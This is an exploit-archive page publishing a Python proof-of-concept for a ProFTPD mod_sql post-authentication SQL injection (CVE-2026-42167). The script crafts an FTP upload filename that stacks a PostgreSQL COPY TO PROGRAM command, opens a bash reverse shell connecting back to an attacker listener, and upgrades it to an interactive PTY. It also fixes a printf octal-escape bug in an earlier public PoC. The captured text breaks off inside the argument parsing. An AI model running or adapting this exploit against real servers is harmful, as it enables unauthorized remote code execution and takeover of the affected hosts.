---
title: ProFTPD mod_sql post-authentication SQLi RCE
url: https://cxsecurity.com/issue/WLB-2026090006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-06
fetch_date: 2026-09-07T06:48:03.044234
---

# ProFTPD mod_sql post-authentication SQLi RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ProFTPD mod\_sql post-authentication SQLi RCE** **2026.09.06**  Credit:  **[Anonymous](https://cxsecurity.com/author/Anonymous/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-42167](https://cxsecurity.com/cveshow/CVE-2026-42167/ "Click to see CVE-2026-42167")**  CWE: **N/A** | |

#!/usr/bin/env python3
"""
CVE-2026-42167 — ProFTPD mod\_sql post-authentication SQL injection -> RCE
postauth\_stor\_rce.py --host <ftp-host> --port 21 \
--user <user> --password <pass> \
--shell-host <your-ip> --shell-port 443
SUMMARY
-------
ProFTPD's mod\_sql logs FTP activity through user-supplied SQL. Its escaping
helper is\_escaped\_text() treats any value that BEGINS and ENDS with a single
quote and contains no interior single quote as "already escaped", and passes
it into the query verbatim. A STOR filename shaped that way therefore breaks
out of the logging INSERT and stacks a second statement. With a PostgreSQL
backend whose role is a superuser, that statement is COPY ... TO PROGRAM,
which runs an arbitrary OS command.
INSERT INTO xfer\_audit VALUES('<basename>', '<user>', now())
basename = ', null, null); COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; --'
-> INSERT INTO xfer\_audit VALUES('', null, null); -- 3 cols, closed
COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; -- stacked
--', '<user>', now()) -- commented out
Two constraints on the filename shape both queries around:
\* NO interior single quote -> the injected SQL is dollar-quoted ($$...$$),
never single-quoted.
\* NO forward slash '/' -> FTP forbids it in a filename. The reverse
shell needs /dev/tcp/<host>/<port>, so the
slashes are produced at runtime by printf's
octal escape \57 ('/').
THE BUG IN THE PUBLIC PoC (fixed here)
--------------------------------------
The widely-circulated PoC builds the path as one printf format string:
printf "\57dev\57tcp\57<host>\57<port>" # BROKEN
printf greedily consumes up to THREE octal digits after a backslash. "\57" is
only two, so if the very next character is itself an octal digit (0-7) it is
swallowed into the escape:
\57 + '1' -> \571 -> octal 571 = 0x179 -> 0x79 mod 256 = 'y'
So a host or port whose first character is 0-7 is silently corrupted:
host=192.168.118.7 port=4444 -> /dev/tcpy92.168.118.7/y444 (broken)
That covers essentially every private-range attacker IP and every common
listener port, which is why the bug is easy to miss (the PoC's defaults happen
to fall in the safe class) and painful to hit — the only visible symptom is a
reverse shell that never connects.
FIX (this script): keep the four literal slashes in the format string, where
each "\57" is followed by a non-octal character, and pass the attacker-
controlled host/port as printf ARGUMENTS instead of interpolating them into
the format string:
printf "\57dev\57tcp\57%s\57%s" "<host>" "<port>" # CORRECT
Now no user-controlled digit is ever adjacent to a "\57", so the corruption is
structurally impossible for any host/port and on any conforming printf.
CVE: CVE-2026-42167
SEVERITY: Critical (post-auth RCE)
"""
import argparse
import ftplib
import io
import os
import select
import signal
import socket
import sys
import termios
import threading
import time
import tty
def build\_payload\_filename(shell\_host: str, shell\_port: int) -> str:
"""Return the STOR filename that stacks a reverse-shell COPY TO PROGRAM.
The reverse-shell command carries the target host/port as printf arguments
(the fix), so no octal-escape corruption is possible.
"""
# /dev/tcp/<host>/<port> is assembled at runtime; the format string holds
# only the slashes, the data is passed as %s arguments.
shell\_cmd = (
f'S=$(printf "\\57dev\\57tcp\\57%s\\57%s" "{shell\_host}" "{shell\_port}");'
f'bash -c "bash -i >& $S 0>&1"'
)
payload = (
"', null, null); "
f"COPY (SELECT $$x$$) TO PROGRAM $${shell\_cmd}$$"
"; --'"
)
# is\_escaped\_text() bypass + FTP filename rules — assert, don't hope.
assert payload[0] == "'" and payload[-1] == "'", "must be single-quote wrapped"
assert "'" not in payload[1:-1], "no interior single quote allowed"
assert "/" not in payload, "no slash allowed in an FTP filename"
return payload
def interactive\_shell(sock: socket.socket) -> None:
"""Upgrade the raw connect-back to a PTY and bridge the local terminal.
The connect-back is a plain `bash -i` with stdio wired to the socket: no
controlling terminal, so no job control and no `su`/`sudo` password prompt.
Replacing it with util-linux `script` forks bash inside a real PTY pair and
bridges that PTY to the inherited socket; the local terminal goes raw and
forwards keystrokes byte-for-byte.
"""
rows, cols = 24, 80
try:
size = os.get\_terminal\_size()
rows, cols = size.lines, size.columns
except OSError:
pass
sock.sendall(
b"export TERM=xterm-256color; exec script -qc bash /dev/null\n"
)
time.sleep(0.4)
sock.sendall(f"stty rows {rows} cols {cols}; clear\n".encode())
def on\_winch(\_sig, \_frame):
try:
sz = os.get\_terminal\_size()
sock.sendall(f"stty rows {sz.lines} cols {sz.columns}\n".encode())
except (OSError, ValueError):
pass
old\_winch = signal.signal(signal.SIGWINCH, on\_winch)
old\_tty = termios.tcgetattr(sys.stdin)
try:
tty.setraw(sys.stdin.fileno())
while True:
r, \_, \_ = select.select([sock, sys.stdin], [], [])
if sock in r:
data = sock.recv(4096)
if not data:
break
os.write(sys.stdout.fileno(), data)
if sys.stdin in r:
data = os.read(sys.stdin.fileno(), 4096)
if not data:
break
sock.sendall(data)
finally:
termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old\_tty)
signal.signal(signal.SIGWINCH, old\_winch)
def main() -> int:
p = argparse.ArgumentParser(
description="CVE-2026-42167 ProFTPD mod\_sql post-auth RCE (fixed PoC)"
)
p.add\_argument("--host", required=True, help="FTP server host")
p.add\_argument("--port", type=int, default=21, help="FTP port (default 21)")
p.add\_argument("--user", required=True, help="FTP username")
p.add\_argument("--password", required=True, help="FTP password")
p.add\_argument(
"--shell-host", required=True,
help="Address the target connects back to (your listener)",
)
p.add\_argument(
"--shell-port", type=int, default=443,
help="L...